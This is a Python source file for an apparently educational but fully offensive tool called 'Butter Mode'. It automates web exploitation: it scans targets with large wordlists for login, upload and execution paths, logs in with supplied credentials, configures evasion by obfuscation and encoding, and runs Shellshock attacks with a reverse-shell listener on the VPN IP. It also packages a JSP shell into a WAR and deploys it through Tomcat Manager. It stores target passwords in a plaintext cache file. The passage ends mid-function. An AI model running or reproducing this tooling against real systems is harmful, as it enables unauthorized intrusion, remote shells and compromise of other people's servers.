"""
Butter Mode - Smooth automated exploitation for file and command-based attacks
"""
import time
import requests
import os
from typing import Optional, Dict, List, Tuple
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from pathlib import Path
from requests.auth import HTTPBasicAuth
import zipfile
import io


from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from learnshells.utils.logger import Logger
from learnshells.core.interface_detector import InterfaceDetector
from learnshells.generators import get_generator
from learnshells.generators.base import PayloadConfig
from learnshells.evasion.obfuscator import Obfuscator
from learnshells.evasion.wrappers import Wrapper
from learnshells.evasion.encoding import Encoder
from requests.auth import HTTPBasicAuth
from learnshells.modules.shellshock_module import ShellshockModule

class ButterMode:
    """
    Butter Mode - Smooth as butter exploitation.
    
    Handles both file-based and command-based attacks with intelligent
    scanning and variant testing.
    """
    
    # Cache file location
    CACHE_FILE = Path.home() / ".learnshells_cache.txt"
    
    def __init__(self, logger: Logger = None):
        """Initialize Butter Mode."""
        self.logger = logger or Logger(educational=False, verbose=False)
        
        # Attack configuration
        self.attack_type = None  # 'file', 'command', or 'auto'
        self.base_url = None
        self.login_url = None
        self.username = None
        self.password = None
        self.session = requests.Session()
        self.session.trust_env = False 
        self.session.verify = False
        
        # File-based attack config
        self.upload_url = None
        self.execute_path = None
        
        # Command-based attack config
        self.command_url = None
        
        # Network config
        self.vpn_ip = None
        self.selected_port = 4444
        self.is_tomcat = False
        
        # Evasion settings
        self.enable_obfuscation = False
        self.enable_wrapper = False
        self.enable_encoding = False
        
        # Results
        self.success = False
        self.vulnerabilities = []
        
        # Components
        self.interface_detector = InterfaceDetector(self.logger)
        self.obfuscator = Obfuscator(self.logger)
        self.wrapper = Wrapper(self.logger)
        self.encoder = Encoder(self.logger)
    
    @staticmethod
    def _load_cache() -> Dict[str, str]:
        """Load cached values from file."""
        cache = {
            'base_url': '',
            'login_url': '',
            'upload_url': '',
            'exec_path': '',
            'command_url': '',
            'username': '',
            'password': ''
        }
        
        if not ButterMode.CACHE_FILE.exists():
            return cache
        
        try:
            with open(ButterMode.CACHE_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        key, value = line.split(':', 1)
                        key = key.strip()
                        value = value.strip()
                        if key in cache:
                            cache[key] = value
        except Exception:
            pass
        
        return cache
    
    @staticmethod
    def _save_cache(cache: Dict[str, str]):
        """Save values to cache file."""
        try:
            with open(ButterMode.CACHE_FILE, 'w') as f:
                f.write(f"base_url: {cache.get('base_url', '')}\n")
                f.write(f"login_url: {cache.get('login_url', '')}\n")
                f.write(f"upload_url: {cache.get('upload_url', '')}\n")
                f.write(f"exec_path: {cache.get('exec_path', '')}\n")
                f.write(f"command_url: {cache.get('command_url', '')}\n")
                f.write(f"username: {cache.get('username', '')}\n")
                f.write(f"password: {cache.get('password', '')}\n")
        except Exception:
            pass
    
    @staticmethod
    def _get_input(prompt: str, cache_key: str, cache: Dict[str, str]) -> Optional[str]:
        """Get input with cache support. Returns None for empty, value otherwise."""
        cached_value = cache.get(cache_key, '')
        
        # Show cached value if it exists
        if cached_value:
            prompt_with_cache = f"{prompt} [cached: {cached_value}] (c=use cached): "
        else:
            prompt_with_cache = f"{prompt}: "
        
        user_input = input(prompt_with_cache).strip()
        
        # Empty input = None
        if not user_input:
            return None
        
        # 'c' = load from cache
        if user_input.lower() == 'c':
            if cached_value:
                return cached_value
            else:
                return None
        
        # Anything else = new value (save to cache)
        cache[cache_key] = user_input
        return user_input
    
    def run(self, port: int = None, **kwargs):
        """Run Butter Mode workflow.
        
        Args:
            port: Optional listener port (default: 4444)
            **kwargs: Additional arguments (ignored for compatibility)
        """
        if port:
            self.selected_port = port
        
        self.logger.banner("""
    ____        __  __            __  ___          __    
   / __ )__  __/ /_/ /____  _____/  |/  /___  ____/ /___ 
  / __  / / / / __/ __/ _ \\/ ___/ /|_/ / __ \\/ __  / _ \\
 / /_/ / /_/ / /_/ /_/  __/ /  / /  / / /_/ / /_/ /  __/
/_____/\\__,_/\\__/\\__/\\___/_/  /_/  /_/\\____/\\__,_/\\___/ 
                                                          
        🧈 Smooth as Butter
        """)
        
        try:
            # Step 1: VPN Detection
            if not self._detect_vpn():
                return
            
            # Step 2: Attack Type Selection
            self._select_attack_type()
            
            # Step 3: Gather Information
            self._gather_information()
            
            # Step 4: Evasion Configuration
            self._configure_evasion()
            
            # Step 5: Scan if needed
            if self.attack_type == 'auto' or self._needs_scanning():
                self._scan_target()
            
            # Step 6: Execute Attack
            if self.attack_type == 'file' or 'file_upload' in [v['type'] for v in self.vulnerabilities]:
                self._execute_file_attack()
            
            if self.attack_type == 'command' or 'command_execution' in [v['type'] for v in self.vulnerabilities]:
                self._execute_command_attack()
                
            # Step 7: Shellshock
            if self.attack_type == 'shellshock' or 'shellshock' in [v['type'] for v in self.vulnerabilities]:
                success = self._attack_shellshock()  # ← Capture return value
                if success:
                    self.shell_received = True  # ← Set the flag
            
            # Step 8: Summary
            self._display_summary()
            
        except KeyboardInterrupt:
            self.logger.warning("\nButter Mode interrupted by user")
        except Exception as e:
            self.logger.error(f"Butter Mode failed: {e}")
            import traceback
            traceback.print_exc()
    
    def _detect_vpn(self) -> bool:
        """Detect VPN connection."""
        self.logger.loading("Detecting VPN interface")
        
        vpn_interface = self.interface_detector.detect_vpn_interface()
        
        if not vpn_interface:
            self.logger.error("No VPN detected - cannot continue")
            return False
        
        self.vpn_ip = self.interface_detector.vpn_ip
        self.logger.success(f"VPN: {vpn_interface} ({self.vpn_ip})")
        
        return True
    
    def _select_attack_type(self):
        """Let user select attack type."""
        self.logger.separator()
        self.logger.header("🎯 Attack Type Selection")
        
        print("\n1. File-based (upload shell)")
        print("2. Command-based (RCE/injection)")
        print("3. I don't know (scan and detect)")
        
        choice = input("\nChoice [1-3]: ").strip()
        
        if choice == '1':
            self.attack_type = 'file'
            self.logger.info("Selected: File-based attack")
        elif choice == '2':
            self.attack_type = 'command'
            self.logger.info("Selected: Command-based attack")
        else:
            self.attack_type = 'auto'
            self.logger.info("Selected: Auto-detect vulnerabilities")
    
#Gather information based on attack type
    def _gather_information(self):
        
        self.logger.separator()
        self.logger.header("📋 Information Gathering")
        
        if self.attack_type == 'file':
            self._gather_file_info()
        elif self.attack_type == 'command':
            self._gather_command_info()
        elif self.attack_type == 'shellshock':
            self._gather_shellshock_info()
        else:
            self._gather_auto_info()
    
    def _gather_file_info(self):
        """Gather information for file-based attack."""
        cache = self._load_cache()
        
        print("\nDo you have all file upload info? [y/n]: ", end='')
        has_all = input().strip().lower() in ['y', 'yes']
        
        if has_all:
            self.login_url = self._get_input("Login page URL (Enter=skip)", 'login_url', cache)
            
            if self.login_url:
                self.username = self._get_input("Username", 'username', cache)
                self.password = self._get_input("Password", 'password', cache)
            
            self.upload_url = self._get_input("Upload endpoint URL", 'upload_url', cache)
            self.execute_path = self._get_input("Execution path URL", 'exec_path', cache)
            
            if self.upload_url:
                self.base_url = self._extract_base_url(self.upload_url)
                cache['base_url'] = self.base_url
        else:
            self.base_url = self._get_input("Base URL", 'base_url', cache)
            self.login_url = self._get_input("Login page (Enter=skip)", 'login_url', cache)
            
            if self.login_url:
                self.username = self._get_input("Username", 'username', cache)
                self.password = self._get_input("Password", 'password', cache)
            
            self.upload_url = self._get_input("Upload endpoint (Enter=skip)", 'upload_url', cache)
            self.execute_path = self._get_input("Execution path (Enter=skip)", 'exec_path', cache)
        
        # Save updated cache
        self._save_cache(cache)
#Gather Shellshock attack information
    def _gather_shellshock_info(self):
        
        self.logger.info("Shellshock (CVE-2014-6271) Attack Setup")
        
        # Auto-configure listener using VPN IP
        self.lhost = self.vpn_ip
        self.lport = 4444
        
        self.logger.success(f"✓ Listener configured: {self.lhost}:{self.lport}")
        self.logger.info("💡 Shellshock targets CGI scripts via HTTP headers")  
        
    def _gather_command_info(self):
        """Gather information for command-based attack."""
        cache = self._load_cache()
        
        print("\nDo you have command execution endpoint? [y/n]: ", end='')
        has_endpoint = input().strip().lower() in ['y', 'yes']
        
        if has_endpoint:
            self.command_url = self._get_input("Command execution URL", 'command_url', cache)
            self.login_url = self._get_input("Login page URL (Enter=skip)", 'login_url', cache)
            
            if self.login_url:
                self.username = self._get_input("Username", 'username', cache)
                self.password = self._get_input("Password", 'password', cache)
            
            if self.command_url:
                self.base_url = self._extract_base_url(self.command_url)
                cache['base_url'] = self.base_url
        else:
            self.base_url = self._get_input("Base URL", 'base_url', cache)
            self.login_url = self._get_input("Login page (Enter=skip)", 'login_url', cache)
            
            if self.login_url:
                self.username = self._get_input("Username", 'username', cache)
                self.password = self._get_input("Password", 'password', cache)
            
            self.command_url = self._get_input("Command endpoint (Enter=skip)", 'command_url', cache)
        
        # Save updated cache
        self._save_cache(cache)
    
    def _gather_auto_info(self):
        """Gather information for auto-detect mode."""
        cache = self._load_cache()
        
        self.base_url = self._get_input("\nBase URL", 'base_url', cache)
        self.login_url = self._get_input("Login page (Enter=skip)", 'login_url', cache)
        
        if self.login_url:
            self.username = self._get_input("Username", 'username', cache)
            self.password = self._get_input("Password", 'password', cache)
        else:
            # Try to auto-detect login page with expanded wordlist (~200 entries)
            self.logger.info("No login page provided, scanning for login pages...")
            common_login_paths = [
                # Common login pages
                '/login', '/login.php', '/login/', '/signin', '/signin.php',
                '/auth', '/auth.php', '/authenticate', '/authenticate.php',
                '/authentication', '/authentication.php', '/session/new',
                '/user/login', '/users/login', '/account/login',
                '/member/login', '/members/login', '/membership/login',
                # Admin panels
                '/admin', '/admin/', '/admin.php', '/admin/login', '/admin/login.php',
                '/admin/index.php', '/administrator', '/administrator/',
                '/administrator.php', '/administrator/login', '/administrator/login.php',
                '/administrator/index.php', '/adminpanel', '/admin_area',
                '/adminarea', '/admin-login', '/admin-panel', '/admin1', '/admin2',
                # CMS-specific (WordPress)
                '/wp-login.php', '/wp-admin', '/wp-admin/', '/wp-admin/login',
                '/wp/wp-login.php', '/wordpress/wp-login.php',
                # CMS-specific (Joomla)
                '/administrator/index.php', '/joomla/administrator', '/administrator/',
                # CMS-specific (Drupal)
                '/user', '/user/login', '/admin/login', '/users/login',
                # Portal/Dashboard
                '/portal', '/portal.php', '/portal/', '/portal/login',
                '/portal/login.php', '/portal/index.php',
                '/dashboard', '/dashboard.php', '/dashboard/login',
                '/home', '/home.php',
                # Control panels
                '/control', '/control.php', '/controlpanel', '/cp', '/cpanel',
                '/manager', '/management', '/manage',
                # Auth variations
                '/log-in', '/log_in', '/log_in.php', '/logon', '/logon.php',
                '/signon', '/signon.php', '/sign-in', '/sign_in', '/sign_in.php',
                '/access', '/access.php', '/authorize', '/enter',
                # Modern frameworks (Laravel, Django, Rails)
                '/auth/login', '/auth/signin', '/authentication/login',
                '/accounts/login', '/users/sign_in',
                # OAuth/SSO
                '/oauth/login', '/oauth/authorize', '/sso', '/sso/login',
                '/saml/login', '/connect',
                # API endpoints
                '/api/login', '/api/auth', '/api/signin', '/api/authenticate',
                '/api/session', '/api/v1/login', '/api/v1/auth',
                '/rest/auth', '/rest/login',
                # Account/Profile
                '/account', '/account/login', '/accounts/login',
                '/my-account', '/myaccount', '/profile/login',
                # Member areas
                '/member', '/member/login', '/members', '/members/login',
                # Language-specific (ASP.NET, JSP)
                '/login.aspx', '/Login.aspx', '/login.asp', '/login.jsp',
                '/signin.aspx', '/auth.aspx', '/Account/Login',
                '/Account/Login.aspx', '/Account/LogOn', '/logon.aspx',
                # Framework-specific patterns
                '/backend', '/backend/login', '/backoffice', '/back-office',
                # Mobile/App
                '/m/login', '/mobile/login', '/app/login',
                # Regional/Language
                '/en/login', '/login/en', '/auth/en', '/cn/login', '/jp/login',
                # Security/2FA
                '/2fa', '/two-factor', '/mfa', '/otp/login',
                # SSO/Federation
                '/federatedlogin', '/idp/login', '/saml2/login',
                '/cas/login', '/kerberos/login',
                # Custom/Branded
                '/customer/login', '/partner/login', '/vendor/login',
                '/supplier/login', '/distributor/login',
                # Client areas
                '/client', '/client/login', '/clientarea', '/clients/login',
                # Old/Legacy
                '/oldadmin', '/legacy/admin', '/backup/admin', '/admin_backup',
                # Testing/Dev
                '/dev/login', '/test/login', '/qa/login', '/stage/login',
                '/staging/login', '/demo/login',
                # Misc common
                '/index.php?login', '/login/index', '/login/admin',
                '/auth/admin', '/signin/admin', '/console', '/console/login',
                '/root', '/root/login',
                # More variations
                '/weblogin', '/web-login', '/webauth', '/user-login',
                '/userlogin', '/secure', '/secure/login', '/private',
                '/private/login', '/staff', '/staff/login', '/employee',
                '/employee/login',
                # Backend panels
                '/panel/login', '/cpanel/login', '/whm/login',
                # Less common
                '/index', '/default', '/main', '/start',
                # Hidden/Obfuscated
                '/.login', '/_login', '/hidden/login',
                # Framework admin
                '/phpmyadmin', '/pma', '/mysql/login', '/db/login',
                # Service-specific
                '/webmail', '/mail/login', '/email/login',
                # Support/Help desk
                '/support/login', '/helpdesk/login', '/ticket/login',
                # E-commerce
                '/shop/login', '/store/login', '/checkout/login',
                # Forums
                '/forum/login', '/board/login', '/community/login',
                # Wiki
                '/wiki/login', '/w/login',
                # Bug tracking
                '/bugs/login', '/issues/login', '/jira/login',
                # Project management
                '/projects/login', '/pm/login',
                # Git/SVN
                '/git/login', '/svn/login', '/repo/login',
                # Monitoring
                '/nagios', '/cacti/login', '/zabbix/login',
                # Cloud panels
                '/cloud/login', '/aws/login', '/azure/login'
            ]
            
            found_logins = []
            
            for path in common_login_paths:
                try:
                    test_url = urljoin(self.base_url, path)
                    response = requests.get(test_url, timeout=5)
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        # Check if it has a login form (password field)
                        if soup.find('form') and soup.find('input', {'type': 'password'}):
                            found_logins.append(test_url)
                            self.logger.success(f"  ✓ Found login page: {path}")
                except:
                    continue
            

            if found_logins:
                if len(found_logins) > 1:
                    print("\n🔐 Multiple login pages found:")
                    for i, url in enumerate(found_logins, 1):
                        print(f"  {i}. {url}")
                    
                    choice = input(f"\nWhich to use? [1-{len(found_logins)}] (default: 1): ").strip()
                    try:
                        idx = int(choice) - 1 if choice.isdigit() and 1 <= int(choice) <= len(found_logins) else 0
                        self.login_url = found_logins[idx]
                    except:
                        self.login_url = found_logins[0]
                else:
                    self.login_url = found_logins[0]
                
                self.logger.info(f"Selected login: {self.login_url}")
                
                if input("Use this login page? [y/n]: ").strip().lower() in ['y', 'yes']:
                    # NOW ASK FOR CREDENTIALS
                    cache = self._load_cache()  # Load cache for credentials too
                    self.username = self._get_input("Username", 'username', cache)
                    self.password = self._get_input("Password", 'password', cache)
                    self._save_cache(cache)  # Save credentials to cache
                else:
                    self.login_url = None
                    
        self.logger.info("\n🎧 Reverse Shell Listener Configuration (for Shellshock/RCE):")
        self.lhost = self.vpn_ip
        self.lport = 4444
        self.logger.success(f"✓ Listener auto-configured: {self.lhost}:{self.lport}")
        
        self._save_cache(cache)
    
    def _configure_evasion(self):
        """Configure evasion options."""
        self.logger.separator()
        self.logger.header("🎭 Evasion Configuration")
        
        print("\nEnable obfuscation? [y/n]: ", end='')
        self.enable_obfuscation = input().strip().lower() in ['y', 'yes']
        
        print("Enable wrappers? [y/n]: ", end='')
        self.enable_wrapper = input().strip().lower() in ['y', 'yes']
        
        print("Enable encoding? [y/n]: ", end='')
        self.enable_encoding = input().strip().lower() in ['y', 'yes']
        
        if self.enable_obfuscation:
            self.logger.success("✓ Obfuscation enabled")
        if self.enable_wrapper:
            self.logger.success("✓ Wrappers enabled")
        if self.enable_encoding:
            self.logger.success("✓ Encoding enabled")
    
    def _needs_scanning(self) -> bool:
        """Check if scanning is needed."""
        if self.attack_type == 'file':
            return not (self.upload_url and self.execute_path)
        elif self.attack_type == 'command':
            return not self.command_url
        return True
    
    def _scan_target(self):
        """Scan target for vulnerabilities."""
        self.logger.separator()
        self.logger.loading("Scanning target for vulnerabilities")
        
        # Login if credentials provided
        if self.login_url and self.username and self.password:
            self._perform_login()
        
        # Scan for file upload
        if self.attack_type in ['file', 'auto']:
            self._scan_for_file_upload()
        
        # Scan for command execution
        if self.attack_type in ['command', 'auto']:
            self._scan_for_command_execution()
        
        #shellshock scan    
        if self.attack_type in ['shellshock', 'auto']:
            self._scan_for_shellshock_module()     
               
        # Display findings
        self._display_scan_results()
    
    def _perform_login(self) -> bool:
        """Perform login to target (supports form-based, HTTP Basic Auth, and session auth)."""
        self.logger.loading(f"Logging in as {self.username}")
        
        try:
            # First, probe the login page to detect auth type
            probe_response = self.session.get(self.login_url, timeout=10, verify=False)
            
            # Check if it's HTTP Basic Auth (401 + WWW-Authenticate header)
            if probe_response.status_code == 401 and 'WWW-Authenticate' in probe_response.headers:
                auth_header = probe_response.headers.get('WWW-Authenticate', '')
                if 'Basic' in auth_header:
                    self.logger.info("Detected HTTP Basic Authentication")
                    return self._perform_basic_auth()
            
            # Otherwise, try form-based login with session
            self.logger.info("Detected form-based authentication")
            success = self._perform_form_login()
            
            # If form login succeeded, verify session is working
            if success and self.command_url:
                # Test if session cookie allows access to protected pages
                test_response = self.session.get(self.command_url, timeout=10, verify=False)
                # If we still get login page, session didn't work
                if 'login' in test_response.text.lower() and 'password' in test_response.text.lower():
                    self.logger.warning("⚠ Session may need verification on first request")
                    # Continue anyway - might work on subsequent requests
                else:
                    self.logger.success("✓ Session authentication verified")
            
            return success
            
        except Exception as e:
            self.logger.error(f"Login error: {e}")
            return False

#Scan for Shellshock 
    def _scan_for_shellshock_module(self):
        
        # Create Shellshock module instance
        shellshock_module = ShellshockModule(
            base_url=self.base_url,
            lhost=self.lhost,
            lport=self.lport,
            session=self.session,
            logger=self.logger
        )
        
        # Run scan
        vulnerabilities = shellshock_module.scan()
        
        # Store results in your main class
        if vulnerabilities:
            # Add to vulnerabilities list
            self.vulnerabilities.append({
                'type': 'shellshock',
                'endpoints': vulnerabilities
            })
            
            # Store first vulnerable endpoint
            self.shellshock_url = shellshock_module.shellshock_url
            self.shellshock_header = shellshock_module.shellshock_header
            self.shellshock_module = shellshock_module
# Uses /manager/text/deploy endpoint for programmatic WAR deployment
    def _upload_tomcat_war(self, war_content: bytes, app_name: str = "shell") -> bool:
        """Upload WAR file to Tomcat Manager using text deployment API."""
        try:
            # Use Tomcat Manager text API for deployment
            deploy_url = urljoin(self.base_url, f'/manager/text/deploy?path=/{app_name}&update=true')
            
            self.logger.loading(f"Deploying WAR to Tomcat Manager: /{app_name}")
            
            # Ensure authentication is present
            if not self.session.auth:
                # Fallback: reconstruct auth if it was lost
                from requests.auth import HTTPBasicAuth
                self.session.auth = HTTPBasicAuth(self.username, self.password)
            
            # PUT the WAR file with authentication
            response = self.session.put(
                deploy_url,
                data=war_content,
                headers={'Content-Type': 'application/octet-stream'},
                timeout=30
            )
            
            self.logger.info(f"Tomcat response: {response.text[:200]}")
            
            if response.status_code == 200 and 'OK' in response.text:
                self.logger.success(f"✓ WAR deployed successfully to /{app_name}")
                self.execute_path = urljoin(self.base_url, f'/{app_name}/')
                return True
            else:
                self.logger.error(f"✗ Deployment failed (HTTP {response.status_code}): {response.text[:200]}")
                return False
                
        except Exception as e:
            self.logger.error(f"Tomcat deployment error: {e}")
            return False
# Only triggered when Tomcat Manager or Java servlet container is detected
    def _package_jsp_to_war(self, jsp_content: str, war_name: str = "shell") -> bytes:
        """Package JSP content into a WAR file for Tomcat deployment."""
        self.logger.info(f"Packaging JSP into WAR format for Tomcat...")
        
        # Create in-memory ZIP (WAR is just a ZIP)
        war_buffer = io.BytesIO()
        
        with zipfile.ZipFile(war_buffer, 'w', zipfile.ZIP_DEFLATED) as war:
            # Add the JSP shell
            war.writestr(f'{war_name}.jsp', jsp_content)
            
            # Add minimal web.xml
            web_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
    <display-name>{}</display-name>
</web-app>'''.format(war_name)
            
            war.writestr('WEB-INF/web.xml', web_xml)
        
        war_buffer.seek(0)
        self.logger.success(f"✓ Created WAR package ({len(war_buffer.getvalue())} bytes)")
        return war_buffer.getvalue()    
    def _perform_basic_auth(self) -> bool:
        """Perform HTTP Basic Authentication."""
        try:
            # Set Basic Auth on the session
            self.session.auth = HTTPBasicAuth(self.username, self.password)
            
            # Test the credentials by making a request
            test_response = self.session.get(self.login_url, timeout=10)
            
            # Check if auth succeeded (not 401)
            if test_response.status_code == 401:
                self.logger.error("✗ Basic Auth failed - invalid credentials")
                return False
            elif test_response.status_code == 200:
                self.logger.success("✓ Basic Auth successful")
                return True
            else:
                self.logger.warning(f"Unexpected status code: {test_response.status_code}")
                if input("Continue anyway? [y/n]: ").strip().lower() in ['y', 'yes']:
                    return True
                return False
                
        except Exception as e:
            self.logger.error(f"Basic Auth error: {e}")
            return False
    
    def _perform_form_login(self) -> bool:
        """Perform form-based login with session cookie support."""
        try:
            # Get the login page (this may set initial cookies)
            response = self.session.get(self.login_url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find login form
            form = soup.find('form')
            if not form:
                self.logger.warning("Could not find login form")
                return False
            
            # Extract form action
            action = form.get('action', '')
            if action:
                login_post_url = urljoin(self.login_url, action)
            else:
                login_post_url = self.login_url
            
            # Find input fields and build form data
            inputs = form.find_all('input')
            form_data = {}
            
            for inp in inputs:
                name = inp.get('name')
                input_type = inp.get('type', 'text').lower()
                value = inp.get('value', '')
                
                if name:
                    if input_type == 'password':
                        form_data[name] = self.password
                    elif input_type in ['text', 'email'] and not value:
                        form_data[name] = self.username
                    else:
                        # Keep hidden fields, CSRF tokens, etc.
                        form_data[name] = value
            
            self.logger.info(f"Logging in to: {login_post_url}")
            
            # Attempt login (session will automatically handle cookies)
            login_response = self.session.post(
                login_post_url, 
                data=form_data, 
                timeout=10, 
                allow_redirects=True,
                verify=False
            )
            
            # Check for session cookies
            if self.session.cookies:
                cookie_names = list(self.session.cookies.keys())
                self.logger.info(f"Session cookies received: {', '.join(cookie_names[:3])}")
            
            # Check if login successful - multiple indicators
            success_indicators = [
                'logout', 'dashboard', 'welcome', 'portal', 'profile',
                'signed in', 'logged in', 'successfully'
            ]
            
            # Check for login failure indicators
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'try again',
                'wrong password', 'authentication failed'
            ]
            
            response_lower = login_response.text.lower()
            
            # If we got redirected, that's usually good
            if login_response.url != login_post_url:
                self.logger.success("✓ Login successful (redirected)")
                return True
            
            # Check for success indicators
            if any(indicator in response_lower for indicator in success_indicators):
                self.logger.success("✓ Login successful")
                return True
            
            # Check for explicit failure
            if any(indicator in response_lower for indicator in failure_indicators):
                self.logger.error("✗ Login failed - invalid credentials")
                return False
            
            # If we can't determine, check if we have session cookies
            if self.session.cookies:
                self.logger.warning("Login status unclear, but have session cookies")
                if input("Does login appear successful? [y/n]: ").strip().lower() in ['y', 'yes']:
                    self.logger.success("✓ Login confirmed by user")
                    return True
            
            return False
                
        except Exception as e:
            self.logger.error(f"Form login error: {e}")
            return False
            
    def _verify_session_access(self, test_url: str) -> bool:
        """Verify that session cookie allows access to protected pages."""
        try:
            response = self.session.get(test_url, timeout=10, verify=False)
            
            # If response contains login form, session doesn't work
            soup = BeautifulSoup(response.text, 'html.parser')
            password_fields = soup.find_all('input', {'type': 'password'})
            
            if password_fields:
                return False  # Still seeing login page
            
            return True  # No login page detected
            
        except Exception as e:
            self.logger.warning(f"Session verification error: {e}")
            return True  # Assume it works if we can't verify
                
    def _scan_for_file_upload(self):
        """Scan for file upload capabilities."""
        self.logger.info("Scanning for file upload forms...")
        
        # Extended upload paths wordlist (~200 entries)
        upload_paths = [
            # Common upload endpoints
            '/upload', '/upload.php', '/upload/', '/uploader', '/uploader.php',
            '/fileupload', '/fileupload.php', '/file-upload', '/file_upload',
            '/upload/index.php', '/uploadfile', '/uploadfiles',
            # Admin upload
            '/admin/upload', '/admin/upload.php', '/admin/fileupload',
            '/admin/file-upload', '/administrator/upload',
            # Panel upload
            '/panel', '/panel/', '/panel/upload', '/panel/index.php',
            '/panel/upload.php', '/control/upload', '/cpanel/upload',
            # Dashboard/Management
            '/dashboard/upload', '/dashboard/fileupload', '/manage/upload',
            '/manager/upload', '/management/upload',
            # User upload
            '/user/upload', '/users/upload', '/member/upload',
            '/profile/upload', '/account/upload',
            # File managers
            '/filemanager', '/filemanager.php', '/file-manager',
            '/file_manager', '/file_manager.php', '/fm', '/fm.php',
            # Media upload
            '/media', '/media/upload', '/media/upload.php', '/uploadmedia',
            # Image upload
            '/image/upload', '/images/upload', '/img/upload',
            '/uploadimage', '/imageupload', '/gallery/upload',
            # Content/CMS
            '/content/upload', '/cms/upload', '/editor/upload',
            # WordPress
            '/wp-admin/upload.php', '/wp-content/uploads',
            '/wp-admin/media-upload.php', '/wp-admin/async-upload.php',
            # Joomla
            '/administrator/index.php?option=com_media',
            '/components/com_media/upload', '/media/upload',
            # Drupal
            '/admin/content/files', '/admin/media', '/file/add',
            # TinyMCE/CKEditor
            '/tinymce/upload', '/tinymce/plugins/filemanager',
            '/ckeditor/upload', '/ckeditor/filemanager',
            '/elfinder/connector', '/kcfinder/upload.php',
            # Cloud/Storage
            '/storage/upload', '/cdn/upload', '/bucket/upload',
            '/assets/upload', '/static/upload', '/public/upload',
            # API
            '/api/upload', '/api/file/upload', '/api/media/upload',
            '/api/v1/upload', '/api/v1/file', '/rest/upload',
            # Language-specific
            '/upload.aspx', '/FileUpload.aspx', '/upload.asp',
            '/upload.jsp', '/fileupload.jsp', '/upload.do',
            # Backend
            '/backend/upload', '/backoffice/upload', '/console/upload',
            # Testing
            '/test/upload', '/demo/upload', '/temp/upload',
            # Import/Export
            '/import', '/import/upload', '/import/file',
            # Attachment
            '/attachments/upload', '/attach/upload',
            # Document
            '/document/upload', '/documents/upload', '/docs/upload',
            # Shared/Transfer
            '/share/upload', '/shared/upload', '/transfer/upload',
            # Mobile
            '/mobile/upload', '/app/upload', '/m/upload',
            # Direct upload
            '/direct-upload', '/resumable-upload',
            # Avatar
            '/avatar/upload', '/profile-picture/upload',
            # Backup
            '/backup/upload', '/restore/upload',
            # Hidden
            '/.upload', '/_upload', '/hidden/upload'
        ]
        
        # Execution paths (where files end up) - (~200 entries)
        execution_paths = [
            # Standard uploads
            '/uploads', '/uploads/', '/upload', '/upload/',
            '/uploaded', '/uploaded/', '/uploadedfiles', '/uploaded_files',
            # Files
            '/files', '/files/', '/Files', '/file', '/file/',
            # Media
            '/media', '/media/', '/images', '/images/', '/img', '/img/',
            '/pics', '/photos', '/pictures',
            # Static/Assets
            '/static', '/static/uploads', '/assets', '/assets/uploads',
            '/public', '/public/uploads', '/resources',
            # Documents
            '/documents', '/docs', '/attachments', '/data',
            # Content
            '/content', '/content/uploads', '/userfiles', '/user_files',
            # WordPress
            '/wp-content/uploads', '/wp-content/uploads/2024',
            '/wp-content/uploads/2025', '/wp-uploads',
            # Drupal
            '/sites/default/files', '/sites/all/files',
            # Joomla
            '/components/com_media/uploads', '/images/stories',
            # Modern frameworks
            '/storage', '/storage/uploads', '/storage/app',
            '/storage/app/uploads', '/storage/public',
            # Temporary
            '/temp', '/temp/uploads', '/tmp', '/tmp/uploads',
            '/cache', '/cache/uploads',
            # User-specific
            '/users/uploads', '/user/uploads', '/members/uploads',
            '/profile/uploads',
            # Admin
            '/admin/uploads', '/administrator/uploads', '/backend/uploads',
            # Archive
            '/archive', '/library', '/repository',
            # Shared
            '/share', '/shared', '/transfer', '/incoming', '/outgoing',
            # Downloads
            '/downloads', '/download',
            # Backup
            '/backup', '/backups', '/old', '/oldfiles',
            # Nested
            '/uploads/files', '/uploads/images', '/uploads/documents',
            '/public/files', '/public/images',
            # Application
            '/app/uploads', '/application/uploads', '/project/uploads',
            # Year organized
            '/uploads/2024', '/uploads/2025', '/files/2024',
            # Category
            '/uploads/pdf', '/uploads/doc', '/files/documents',
            # Hidden
            '/.uploads', '/_uploads',
            # Development
            '/dev/uploads', '/test/uploads', '/demo/uploads',
            # Cloud
            '/cdn/uploads', '/s3/uploads', '/blob/uploads',
            # Exports/Imports
            '/export', '/exports', '/import', '/imports',
            # CMS
            '/userfiles/files', '/userfiles/image', '/ckfinder/userfiles',
            # Gallery
            '/gallery', '/galleries', '/album', '/albums',
            # Avatars
            '/avatars', '/profiles', '/profile-pictures',
            # API
            '/api/uploads', '/api/files', '/rest/uploads',
            # Secure
            '/secure/uploads', '/private/uploads', '/protected/uploads',
            # Client
            '/client/uploads', '/customer/uploads',
            # Output
            '/output', '/results', '/submissions',
            # Public accessible
            '/pub/uploads', '/public_html/uploads', '/www/uploads'
        ]
        
        found_uploads = []
        found_execution_paths = []
        
        # 1. Check common paths
        self.logger.info("→ Checking common upload paths...")
        for path in upload_paths:
            try:
                url = urljoin(self.base_url, path)
                response = self.session.get(url, timeout=5, allow_redirects=True)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    file_inputs = soup.find_all('input', {'type': 'file'})
                    
                    if file_inputs:
                        found_uploads.append(url)
                        self.logger.success(f"  ✓ Found upload form: {path}")
                        if not self.upload_url:
                            self.upload_url = url
            except:
                continue
        
        # 2. Check execution paths (where files go)
        if found_uploads:
            self.logger.info("→ Checking execution paths...")
            for path in execution_paths:
                try:
                    url = urljoin(self.base_url, path)
                    response = self.session.get(url, timeout=5)
                    
                    # Check if path exists and is accessible
                    if response.status_code == 200:
                        found_execution_paths.append(url)
                        self.logger.success(f"  ✓ Found execution path: {path}")
                        if not self.execute_path:
                            self.execute_path = url
                except:
                    continue
        
        # 3. Spider main page for file upload forms
